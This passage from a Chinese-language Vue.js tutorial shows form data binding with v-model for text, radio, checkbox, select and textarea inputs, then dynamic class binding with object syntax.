</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">p</span> <span class="na">v-if</span><span class="o">=</span><span class="s">&#34;result != &#39;&#39;&#34;</span><span class="p">&gt;</span>您选择的是：{{result}}<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">result</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>为下拉列表进行数据绑定：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">select</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;selectedItem&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">option</span> <span class="na">hidden</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>选择一门编程语言<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;C/C++&#34;</span><span class="p">&gt;</span>C/C++<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Java&#34;</span><span class="p">&gt;</span>Java<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Go&#34;</span><span class="p">&gt;</span>Go<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Python&#34;</span><span class="p">&gt;</span>Python<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">select</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">p</span> <span class="na">v-if</span><span class="o">=</span><span class="s">&#34;selectedItem != &#39;&#39;&#34;</span><span class="p">&gt;</span>您选择的是：{{selectedItem}}<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">selectedItem</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>下方是演示了收集表单数据中一些常用的方式：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">form</span> <span class="err">@</span><span class="na">submit</span><span class="err">.</span><span class="na">prevent</span><span class="o">=</span><span class="s">&#34;submit&#34;</span><span class="p">&gt;</span><span class="c">&lt;!-- 提交后不跳转 --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 普通输入框 --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;account&#34;</span><span class="p">&gt;</span>账号<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 去掉首尾空格 --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;account&#34;</span> <span class="na">v-model</span><span class="err">.</span><span class="na">trim</span><span class="o">=</span><span class="s">&#34;userInfo.account&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;password&#34;</span><span class="p">&gt;</span>密码<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;userInfo.password&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 控制输入为数字类型 --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;age&#34;</span><span class="p">&gt;</span>年龄<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;number&#34;</span> <span class="na">v-model</span><span class="err">.</span><span class="na">number</span><span class="o">=</span><span class="s">&#34;userInfo.age&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 单选框 --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>性别：
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;radio&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;male&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;sex&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;male&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;userInfo.sex&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;male&#34;</span><span class="p">&gt;</span>男<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;radio&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;female&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;sex&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;female&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;userInfo.sex&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;female&#34;</span><span class="p">&gt;</span>女<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 多选框 --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span> 爱好：
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">      checkbox 如果不配置 value
</span></span></span><span class="line"><span class="cl"><span class="c">      那么默认读取的是输入框的 checked 值（布尔类型）
</span></span></span><span class="line"><span class="cl"><span class="c">      --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;checkbox&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;sing&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;sing&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;userInfo.hobbies&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;sing&#34;</span><span class="p">&gt;</span>唱歌<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;checkbox&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;dance&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;dance&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;userInfo.hobbies&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;dance&#34;</span><span class="p">&gt;</span>跳舞<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;checkbox&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;rap&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;rap&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;userInfo.hobbies&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;rap&#34;</span><span class="p">&gt;</span>Rap<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;checkbox&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;basketball&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;basketball&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;userInfo.hobbies&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;basketball&#34;</span><span class="p">&gt;</span>打篮球<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 下拉选择框 --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span> 所在地：
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">select</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;userInfo.city&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="na">hidden</span><span class="p">&gt;</span>请选择校区<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;beijing&#34;</span><span class="p">&gt;</span>北京<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;shanghai&#34;</span><span class="p">&gt;</span>上海<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;wuhan&#34;</span><span class="p">&gt;</span>武汉<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">select</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">      文本输入框
</span></span></span><span class="line"><span class="cl"><span class="c">      在 change 事件中同步
</span></span></span><span class="line"><span class="cl"><span class="c">      --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span> 备注：<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">textarea</span> <span class="na">v-model</span><span class="err">.</span><span class="na">lazy</span><span class="o">=</span><span class="s">&#34;userInfo.note&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">textarea</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;checkbox&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;agree&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;userInfo.agree&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 勾选框 --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;agree&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      阅读并接受<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://linner.asia&#34;</span><span class="p">&gt;</span>《用户协议》<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="nt">button</span><span class="p">&gt;</span>提交<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">userInfo</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">account</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">password</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">age</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">sex</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">hobbies</span><span class="o">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">        <span class="nx">city</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">note</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">agree</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">submit</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">userInfo</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><ul>
<li><code>&lt;input type=&quot;text&quot;&gt;</code>：<code>v-model</code>收集的是<code>value</code>值，而用户输入的就是<code>value</code>值。</li>
<li><code>&lt;input type=&quot;radio&quot;&gt;</code>：<code>v-model</code>收集的是<code>value</code>值，且要给标签配置<code>value</code>值。</li>
<li><code>&lt;input type=&quot;checkbox&quot;&gt;</code>：
<ul>
<li>没有配置<code>input</code>的<code>value</code>属性，那么收集的就是<code>checked</code>（勾选为<code>true</code>，未勾选为<code>false</code>）。</li>
<li>配置了<code>input</code>的<code>value</code>属性：
<ul>
<li><code>v-model</code>的初始值是非数组，那么收集的就是<code>checked</code>。</li>
<li><code>v-model</code>的初始值是数组，那么收集的的就是<code>value</code>组成的数组。</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h1 id="样式绑定" data-numberify>样式绑定<a class="anchor ms-1" href="#样式绑定"></a></h1>
<p>Vue.js <code>v-bind</code> 在处理 <code>class</code> 和 <code>style</code> 时，专门增强了它。表达式的结果类型除了字符串之外，还可以是对象或数组。</p>
<h2 id="class-绑定" data-numberify>class 绑定<a class="anchor ms-1" href="#class-绑定"></a></h2>
<p>例如为<code>v-bind:class</code>设置一个对象，从而动态的切换<code>class</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.min.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="nc">red</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">color</span><span class="p">:</span> <span class="kc">red</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;ch-color&#34;</span><span class="p">&gt;</span>修改颜色<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;checkbox&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;use&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;ch-color&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">:class</span><span class="o">=</span><span class="s">&#34;{&#39;red&#39;: use}&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">code</span><span class="p">&gt;</span>v-bind:class<span class="p">&lt;/</span><span class="nt">code</span><span class="p">&gt;</span> 指令
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">      <span class="nx">el</span><span class="o">:</span> <span class="s1">&#39;#app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">use</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>在<code>:class=&quot;{'red': use}&quot;</code>这条指令中，当<code>use</code>为<code>true</code>时，<code>red</code>将会被应用在该<code>class</code>属性上。即当<code>use</code>为<code>true</code>时，<code>:class=&quot;{'red': use}&quot;</code>相当于<code>class=&quot;red&quot;</code>。</p>
<p><code>:class</code>样式绑定可以同时动态地绑定多个样式：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.min.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="nc">redBox</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">background-color</span><span class="p">:</span> <span class="kc">red</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">#</span><span class="nn">app</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">width</span><span class="p">:</span> <span class="mi">100</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">height</span><span class="p">:</span> <span class="mi">100</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">text-align</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">line-height</span><span class="p">:</span> <span class="mi">100</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">background-color</span><span class="p">:</span> <span class="kc">yellow</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">user-select</span><span class="p">:</span> <span class="kc">none</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="nc">bold</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">font-weight</span><span class="p">:</span> <span class="kc">bold</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">:class</span><span class="o">=</span><span class="s">&#34;{&#39;redBox&#39;: isClicked, &#39;bold&#39;: isBold}&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;clicked&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      点击切换样式
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">      <span class="nx">el</span><span class="o">:</span> <span class="s1">&#39;#app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">isClicked</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">isBold</span><span class="o">:</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">clicked</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">this</span><span class="p">.</span><span class="nx">isClicked</span> <span class="o">=</span> <span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">isClicked</span>
</span></span><span class="line"><span class="cl">          <span class="k">this</span><span class="p">.</span><span class="nx">isBold</span> <span class="o">=</span> <span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">isBold</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>如果<code>:class</code>中指定的对象过长，可以使用计算属性<code>computed</code>来定义。例如：</p>
